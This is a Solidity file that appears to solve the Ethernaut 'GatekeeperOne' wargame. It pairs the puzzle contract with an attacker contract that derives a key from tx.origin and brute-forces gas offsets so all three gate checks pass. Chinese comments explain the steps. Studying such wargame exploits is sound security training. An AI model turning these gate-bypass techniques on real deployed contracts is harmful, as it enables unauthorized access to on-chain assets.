// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract GatekeeperOneAttacker {
    function attack(address gateAddr) external returns (bool) {
        // 把第三和第四个 byte 转成 0，符合条件 gateThree 的第二个条件，其他的不变
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        // 找到符合目标的 gas
        for (uint256 i = 0; i < 1024; i++) { 
            (bool result,) = gateAddr.call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)",gateKey));
            if (result) {
                return true;
            }
        }
        return false;
    }
}



contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}